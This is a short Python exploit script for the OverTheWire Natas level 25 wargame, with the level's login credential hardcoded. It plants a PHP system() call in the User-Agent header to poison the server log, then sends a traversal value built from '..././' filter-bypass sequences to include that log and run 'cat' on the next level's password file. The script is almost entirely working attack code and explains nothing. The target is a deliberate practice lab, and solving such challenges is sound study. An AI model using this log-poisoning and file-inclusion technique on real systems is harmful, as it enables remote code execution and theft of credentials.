import requests 
import re

session = requests.Session()

headers = {'User-Agent': '<?php system("cat /etc/natas_webpass/natas26"); ?>' }

response = session.get('http://natas25.natas.labs.overthewire.org', auth = ('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'))


response = session.post('http://natas25.natas.labs.overthewire.org', headers = headers, auth = ('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'), data = {'lang': '..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'})

print(response.text)